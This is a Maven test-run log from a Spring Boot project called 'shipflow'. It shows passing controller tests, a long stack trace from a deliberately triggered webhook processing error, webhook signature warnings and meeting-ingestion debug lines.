	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

[INFO] Tests run: 7, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.070 s -- in com.github.farzadsedaghatbin.shipflow.controller.ReportControllerIntegrationTest$GetEnhancedReportTests
[INFO] Tests run: 0, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 3.912 s -- in com.github.farzadsedaghatbin.shipflow.controller.ReportControllerIntegrationTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.GitHubWebhookControllerTest

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v3.2.1)

2026-01-17T23:26:37.492Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookControllerTest    : Starting GitHubWebhookControllerTest using Java 21.0.2 with PID 89700 (started by farzad in /Users/farzad/IdeaProjects/git/shapeup-tracker/backend)
2026-01-17T23:26:37.492Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookControllerTest    : Running with Spring Boot v3.2.1, Spring v6.1.2
2026-01-17T23:26:37.492Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookControllerTest    : No active profile set, falling back to 1 default profile: "default"
2026-01-17T23:26:37.878Z  WARN 89700 --- [shipflow] [           main] .s.s.UserDetailsServiceAutoConfiguration : 

Using generated security password: b1a62ffe-ed46-434d-a30d-e4fa987bc1ee

This generated password is for development use only. Your security configuration must be updated before running your application in production.

2026-01-17T23:26:37.881Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.JwtAuthenticationFilter        : Filter 'jwtAuthenticationFilter' configured for use
2026-01-17T23:26:37.884Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookControllerTest    : Started GitHubWebhookControllerTest in 0.4 seconds (process running for 23.335)
2026-01-17T23:26:37.895Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookController        : Received GitHub webhook event: push
2026-01-17T23:26:37.898Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookController        : Received GitHub webhook event: push
2026-01-17T23:26:37.898Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookController        : Missing signature for webhook event
2026-01-17T23:26:37.901Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookController        : Received GitHub webhook event: push
2026-01-17T23:26:37.901Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookController        : Invalid signature for webhook event
2026-01-17T23:26:37.904Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookController        : Received GitHub webhook event: ping
2026-01-17T23:26:37.907Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookController        : Received GitHub webhook event: push
2026-01-17T23:26:37.907Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.c.GitHubWebhookController        : Error processing webhook

java.lang.RuntimeException: Processing failed
	at com.github.farzadsedaghatbin.shipflow.service.github.GitHubWebhookService.processWebhook(GitHubWebhookService.java:63) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.GitHubWebhookController.handleWebhook(GitHubWebhookController.java:53) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:914) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:365) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:374) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.GitHubWebhookControllerTest.handleWebhook_ProcessingError_ShouldReturn500(GitHubWebhookControllerTest.java:152) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:37.911Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.e.GlobalExceptionHandler         : Missing required header: X-GitHub-Event
[INFO] Tests run: 6, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.436 s -- in com.github.farzadsedaghatbin.shipflow.controller.GitHubWebhookControllerTest
[INFO] Running com.github.farzadsedaghatbin.shipflow.controller.MeetingControllerIntegrationTest
2026-01-17T23:26:37.968Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling meeting event for meeting ID: 3
2026-01-17T23:26:37.977Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: meeting_3_0
2026-01-17T23:26:37.977Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested meeting: DEMO (ID: 3)
2026-01-17T23:26:38.053Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling meeting event for meeting ID: 32
2026-01-17T23:26:38.062Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: meeting_32_0
2026-01-17T23:26:38.062Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested meeting: RETROSPECTIVE (ID: 32)
2026-01-17T23:26:38.076Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling meeting event for meeting ID: 33
2026-01-17T23:26:38.084Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: meeting_33_0
2026-01-17T23:26:38.084Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested meeting: DEMO (ID: 33)
2026-01-17T23:26:38.096Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling meeting event for meeting ID: 35
2026-01-17T23:26:38.104Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: meeting_35_0
2026-01-17T23:26:38.104Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested meeting: RETROSPECTIVE (ID: 35)
2026-01-17T23:26:38.144Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling meeting event for meeting ID: 39
2026-01-17T23:26:38.152Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: meeting_39_0
2026-01-17T23:26:38.152Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested meeting: STANDUP (ID: 39)
2026-01-17T23:26:38.184Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.service.KnowledgeEventListener   : Handling meeting event for meeting ID: 45
2026-01-17T23:26:38.195Z DEBUG 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Embedded knowledge item: meeting_45_0
2026-01-17T23:26:38.195Z  INFO 89700 --- [shipflow] [           main] c.g.f.s.s.KnowledgeIngestionService      : Ingested meeting: STANDUP (ID: 45)
[INFO] Tests run: 15, Failures: 0, Errors: 0, Skipped: 0, Time elapsed: 0.294 s -- in com.github.farzadsedaghatbin.shipflow.controller.MeetingControllerIntegrationTest
